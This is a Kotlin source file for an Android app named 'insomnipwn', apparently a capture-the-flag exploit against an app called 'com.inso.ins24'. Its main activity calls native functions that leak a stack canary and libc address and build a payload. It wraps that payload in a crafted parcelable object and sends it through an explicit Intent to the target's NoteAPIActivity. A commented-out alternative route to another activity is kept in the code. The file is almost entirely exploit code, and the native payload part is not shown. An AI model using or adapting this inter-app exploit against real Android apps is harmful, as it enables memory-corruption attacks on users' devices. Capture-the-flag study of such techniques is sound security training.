package com.example.insomnipwn

import android.content.Intent
import android.os.Bundle
import android.util.Log
import android.widget.Button
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.inso.ins24.utils.CryptoConfig

import com.inso.ins24.utils.JSONBuilder

class MainActivity : AppCompatActivity() {

    private external fun nativeLeakCanary(): Long
    private external fun nativeLeakLibc(): Long
    private external fun buildPayload(): ByteArray

    companion object {
        init {
            System.loadLibrary("mynativelib");
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val pwnButton = findViewById<Button>(R.id.pwnButton)
        pwnButton.setOnClickListener {
            //Construct the malicious parcelable object
            val IN = "data"
            val ALGO = buildPayload();
            val evilCryptoConfig = CryptoConfig(ALGO, IN)
            val evilParcelable = JSONBuilder(evilCryptoConfig)

            //Send malicious Intent

            //Way 1. This was a bit unreliable.
            /*
            val intent = Intent()
            intent.setClassName("com.inso.ins24", "com.inso.ins24.MainActivity")
            intent.putExtra("exit", evilParcelable)
            startActivity(intent)
            */

            //Way 2
            val intent = Intent()
            intent.setClassName("com.inso.ins24", "com.inso.ins24.NoteAPIActivity")
            intent.putExtra("my_first_note", "Note")
            intent.putExtra("foo", evilParcelable)
            startActivity(intent)

            Log.i("[insomnipwn]","Intent sent!")
            Toast.makeText(this, "Intent sent!", Toast.LENGTH_SHORT).show();
        }
    }
}
